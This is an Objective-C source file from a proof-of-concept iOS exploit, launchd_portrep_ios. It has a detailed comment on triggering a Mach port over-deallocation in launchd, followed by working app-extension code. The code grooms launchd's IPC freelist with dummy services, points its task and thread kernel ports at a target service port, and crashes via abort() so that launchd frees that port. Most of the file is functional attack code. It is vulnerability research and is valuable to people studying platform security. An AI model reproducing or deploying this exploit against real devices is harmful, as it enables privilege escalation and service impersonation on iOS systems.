/*
 * launchd_portrep_ios
 * Brandon Azad
 *
 *
 * launchd_portrep_ios
 * ================================================================================================
 *
 * Triggering the vulnerability
 * ------------------------------------------------------------------------------------------------
 *
 *  In order to actually trigger the vulnerability, we need to call task_set_special_port() and
 *  thread_set_special_port() to set the TASK_KERNEL_PORT and THREAD_KERNEL_PORT to a send right to
 *  the port we want to free in launchd and then we need to generate an EXC_CRASH exception that
 *  gets sent to launchd.
 *
 *  Generating an EXC_CRASH exception is not difficult: a call to abort() will do it. However, once
 *  we call abort(), there is no way for the exploit process to recover: calling abort() will
 *  trigger process death. Thus, if we want to be able to run any code at all after triggering the
 *  vulnerability, we need a way to perform the crash in another process.
 *
 *  (With other exception types a process could actually recover from the exception. The way a
 *  process would recover is to set its thread exception handler to be launchd and its task
 *  exception handler to be itself. After launchd processes and fails to handle the exception, the
 *  kernel would send the exception to the task handler, which would reset the thread state and
 *  inform the kernel that the exception has been handled. However, a process cannot catch its own
 *  EXC_CRASH exceptions.)
 *
 *  One strategy would be to exploit a vulnerability in another process on iOS and force that
 *  process to set its kernel ports and crash. However, for this proof-of-concept, it's easier to
 *  create an app extension.
 *
 *  App extensions, introduced in iOS 8, provide a way to package some functionality of an
 *  application so it is available outside of the application. The code of an app extension runs in
 *  a separate, sandboxed process. This makes it very easy to launch a process that will set its
 *  special ports, register launchd as its exception handler for EXC_CRASH, and then call abort().
 *
 *  However, one challenge you would notice if you ran the exploit this way is that occasionally
 *  you would not be able to reacquire the freed port. The reason for this is that the kernel
 *  tracks a process's free IPC entries in a freelist, and so a just-freed port name will be reused
 *  (with a different generation number) when a new port is allocated in the IPC table. Thus, we
 *  will only reallocate the port name we want if launchd doesn't reuse that IPC entry slot for
 *  another port first.
 *
 *  The way around this is to bury the free IPC entry slot down the freelist, so that if launchd
 *  allocates new ports those other slots will be used first. How do we do this? We can register a
 *  bunch of dummy Mach services in launchd with ports to which we hold the receive right. When we
 *  call abort(), the exception handler will fire first, and then the process state, including the
 *  Mach ports, will be cleaned up. When launchd receives the EXC_CRASH exception it will
 *  inadvertently free the target service port, placing the IPC entry slot corresponding to that
 *  port name at the head of the freelist. Then, when the rest of our app extension's Mach ports
 *  are destroyed, launchd will receive notifications and free the dummy service ports, burying the
 *  target IPC entry slot behind the slots for the just-freed ports. Thus, as long as launchd
 *  allocates fewer ports than the number of dummy services we registered, the target slot will
 *  still be on the freelist, meaning we can still cause launchd to reallocate the slot with the
 *  same port name as the original service.
 *
 *  The limitation of this strategy is that we need the com.apple.security.application-groups
 *  entitlement in order to register services with launchd. There are other ways to stash Mach
 *  ports in launchd, but using application groups is certainly the easiest, and suffices for this
 *  proof-of-concept.
 *
 */

#import "LaunchdPortrepCrasherExtensionRequestHandler.h"

#include "bootstrap.h"
#include "config.h"

#import <MobileCoreServices/MobileCoreServices.h>

#include <mach/mach.h>
#include <os/log.h>

#define ERROR(fmt, ...)		os_log_error(OS_LOG_DEFAULT, fmt, ##__VA_ARGS__)

// Check in with the controller to get the service port we will crash.
static mach_port_t
launchd_portrep_crasher_check_in(const char *control_service_name) {
	mach_port_t service_port = MACH_PORT_NULL;
	// First look up the control port.
	mach_port_t control_port = MACH_PORT_NULL;
	kern_return_t kr = bootstrap_look_up(bootstrap_port, control_service_name, &control_port);
	if (kr != KERN_SUCCESS || !MACH_PORT_VALID(control_port)) {
		ERROR("bootstrap_look_up: %u, %x", kr, control_port);
		goto fail;
	}
	// Build the Mach message to check in with the controller.
	struct __attribute__((packed)) {
		mach_msg_header_t  hdr;
		mach_msg_trailer_t trailer;
	} msg = {};
	mach_port_t reply_port = mig_get_reply_port();
	msg.hdr.msgh_bits        = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE, 0, 0);
	msg.hdr.msgh_size        = sizeof(msg.hdr);
	msg.hdr.msgh_remote_port = control_port;
	msg.hdr.msgh_local_port  = reply_port;
	msg.hdr.msgh_id          = 0x77889900;
	// Send the message.
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Waddress-of-packed-member"
	kr = mach_msg(&msg.hdr,
			MACH_SEND_MSG | MACH_RCV_MSG,
			msg.hdr.msgh_size,
			sizeof(msg),
			reply_port,
			MACH_MSG_TIMEOUT_NONE,
			MACH_PORT_NULL);
#pragma clang diagnostic pop
	if (kr != KERN_SUCCESS) {
		ERROR("mach_msg: 0x%x", kr);
		goto fail;
	}
	// Check the response.
	if (msg.hdr.msgh_size != sizeof(msg.hdr)) {
		ERROR("Control reply message: unexpected size: %u", msg.hdr.msgh_size);
		goto fail;
	}
	if (msg.hdr.msgh_id != 0x889900aa) {
		ERROR("Control reply message: unexpected id: 0x%x", msg.hdr.msgh_id);
		goto fail;
	}
	// If everything checks out, the remote port of this message is the service port we are
	// targeting.
	service_port = msg.hdr.msgh_remote_port;
fail:
	mach_port_deallocate(mach_task_self(), control_port);
	return service_port;
}

// Stash some dummy ports in launchd so that the freed port gets pushed down the freelist when we
// crash.
static void
launchd_stash_ports_for_freelist() {
	kern_return_t kr;
	unsigned pid = getpid();
	for (size_t i = 0; i < PORT_FREELIST_COUNT; i++) {
		mach_port_t port;
		kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
		if (kr != KERN_SUCCESS) {
			ERROR("mach_port_allocate: %u", kr);
			continue;
		}
		mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
		char dummy_service[strlen(APP_GROUP) + 64];
		snprintf(dummy_service, sizeof(dummy_service), "%s.freelist.%u.%zu",
				APP_GROUP, pid, i);
		kr = bootstrap_register(bootstrap_port, dummy_service, port);
		if (kr != KERN_SUCCESS) {
			ERROR("bootstrap_register: %u", kr);
			mach_port_destroy(mach_task_self(), port);
		}
	}
}

// Try to free the service port in launchd by crashing.
static void
launchd_portrep_crash(mach_port_t service_port) {
	mach_port_t task_self   = mach_task_self();
	mach_port_t thread_self = mach_thread_self();
	kern_return_t kr;
	// Set our thread exception port to the bootstrap port. That way when we crash the
	// exception message will be delivered to launchd, straight from the kernel. :)
	kr = thread_set_exception_ports(
			thread_self,
			EXC_MASK_CRASH,
			bootstrap_port,
			EXCEPTION_DEFAULT | MACH_EXCEPTION_CODES,
			ARM_THREAD_STATE64);
	if (kr != KERN_SUCCESS) {
		ERROR("thread_set_exception_ports: %u", kr);
		return;
	}
	// Set the service port we want to free as our advertised task and thread ports. This will
	// cause the kernel to set the "thread" and "task" ports in the mach_exception_raise
	// message to the service port rather than our true thread and task ports.
	kr = task_set_special_port(task_self, TASK_KERNEL_PORT, service_port);
	if (kr != KERN_SUCCESS) {
		ERROR("task_set_special_port: %u", kr);
		return;
	}
	kr = thread_set_special_port(thread_self, THREAD_KERNEL_PORT, service_port);
	if (kr != KERN_SUCCESS) {
		ERROR("thread_set_special_port: %u", kr);
		return;
	}
	// Crash. abort() will generate an EXC_CRASH exception, which is the exact message type
	// that will cause launchd to over-deallocate the ports.
	abort();
}

@implementation LaunchdPortrepCrasherExtensionRequestHandler

- (void)beginRequestWithExtensionContext:(NSExtensionContext *)context {
	NSExtensionItem *item = nil;
	NSString *controlServiceName = nil;
	// We should have one input item.
	if (context.inputItems.count != 1) {
		ERROR("context.inputItems.count = %lu", (unsigned long)context.inputItems.count);
		goto cancel;
	}
	// We should have one attachment.
	item = context.inputItems[0];
	if (item.attachments.count != 1) {
		ERROR("item.attachments.count = %lu", item.attachments.count);
		goto cancel;
	}
	// The attachment should be the service name of the control port.
	controlServiceName = item.attachments[0];
	if (![controlServiceName isKindOfClass:[NSString class]]) {
		ERROR("controlServiceName not NSString");
		goto cancel;
	}
	// Message the control service to receive the Mach service port we will free.
	const char *control_service_name = controlServiceName.UTF8String;
	mach_port_t service_port = launchd_portrep_crasher_check_in(control_service_name);
	if (service_port == MACH_PORT_NULL) {
		goto cancel;
	}
	// Register a bunch of ports in launchd so that the freed service port gets pushed down the
	// freelist.
	launchd_stash_ports_for_freelist();
	// Now try to free the service port in launchd by crashing.
	launchd_portrep_crash(service_port);
	mach_port_deallocate(mach_task_self(), service_port);
cancel:;
	NSError *error = [NSError errorWithDomain:@"launchd_portrep_crasher"
					     code:0
					 userInfo:nil];
	[context cancelRequestWithError:error];
}

@end
